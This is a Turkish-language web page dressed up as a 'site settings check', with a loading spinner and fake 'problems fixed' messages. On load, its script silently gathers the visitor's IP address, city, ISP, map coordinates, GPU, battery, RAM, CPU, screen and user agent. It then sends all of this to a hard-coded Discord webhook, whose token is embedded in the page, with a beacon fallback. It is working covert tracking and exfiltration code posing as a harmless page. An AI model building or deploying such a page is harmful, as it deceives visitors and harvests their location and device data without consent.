<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background-color: #0f0f0f; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #eeeeee; }
        .container { text-align: center; }
        .loader { border: 3px solid #333; border-top: 3px solid #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.6s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 400; font-size: 15px; margin: 0; color: #555; }
        .success-text { color: #00ff41; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader" class="loader"></div>
        <h2 id="msg">Site ayarlarƒ± kontrol ediliyor...</h2>
    </div>

    <script>
        // Webhook URL'ni kontrol et (Sonunda bo≈üluk kalmasƒ±n)
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function herSeyiDok() {
            let data = { gpu: "Bilinmiyor", ven: "Bilinmiyor", loc: "Y√ºkleniyor...", ip: "X", bat: "X", lang: "Bilinmiyor", ram: "Bilinmiyor", cpu: "Bilinmiyor", screen: "Bilinmiyor" };

            // 1. IP ve SESSƒ∞Z KONUM (ƒ∞zin ƒ∞stemez)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const j = await res.json();
                data.ip = j.ip;
                // Google Maps linkindeki hata d√ºzeltildi (${j.latitude} kullanƒ±ldƒ±)
                data.loc = `üìç **B√∂lge:** ${j.city}, ${j.region} / ${j.country_name}\nüõ∞Ô∏è **ISP:** ${j.org}\nüîó [Haritada G√∂r](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
            } catch(e) {
                data.loc = "Lokasyon alƒ±namadƒ±";
            }

            // 2. GPU ve VENDOR (Efsane Sorgu Fix)
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                const d = gl.getExtension('WEBGL_debug_renderer_info');
                if (d) {
                    data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
                    data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
                }
            } catch(e) {}

            // 3. Pƒ∞L, RAM, CPU ve Dƒ∞L
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
                }
                data.ram = `${navigator.deviceMemory || 'X'} GB`;
                data.cpu = `${navigator.hardwareConcurrency || 'X'} √áekirdek`;
                data.lang = navigator.language || "Bilinmiyor";
                data.screen = `${window.screen.width}x${window.screen.height}`;
            } catch(e) {}

            // 4. KIRMIZI EMBED ≈ûABLONU
            const payload = {
                embeds: [{
                    title: "üïµÔ∏è KRƒ∞Tƒ∞K Sƒ∞STEM ANALƒ∞Zƒ∞ (REVIZED)",
                    color: 15158332,
                    fields: [
                        { name: "üìç LOKASYON (IP TABANLI)", value: data.loc, inline: false },
                        { name: "üõ†Ô∏è DONANIM KATMANI", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\`\n**RAM:** ${data.ram}\n**CPU:** ${data.cpu}`, inline: false },
                        { name: "üì± YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${data.screen}`, inline: true },
                        { name: "üîã DURUM", value: data.bat, inline: true },
                        { name: "üîç USER AGENT", value: "```" + navigator.userAgent + "```", inline: false },
                        { name: "üåê EK Bƒ∞LGƒ∞", value: `**IP:** ${data.ip} | **Dil:** ${data.lang}`, inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            // 5. EN GARANTƒ∞ G√ñNDERƒ∞M (Fetch Force)
            const blob = JSON.stringify(payload);
            
            // Discord'a no-cors modunda deƒüil, doƒürudan g√∂ndermeyi deniyoruz
            fetch(u, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: blob
            }).catch(() => {
                // Eƒüer fetch tarayƒ±cƒ± engeline takƒ±lƒ±rsa yedek olarak Beacon fƒ±rlatƒ±r
                navigator.sendBeacon(u, blob);
            });

            // 6. ARAY√úZ AKI≈ûI
            const msg = document.getElementById('msg');
            const loader = document.getElementById('loader');
            
            setTimeout(() => {
                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
            }, 800);

            setTimeout(() => {
                loader.style.display = "none";
                msg.innerHTML = '<span class="success-text">Sorunlar d√ºzeltildi.</span>';
            }, 1800);
        }

        window.onload = herSeyiDok;
    </script>
</body>
</html>

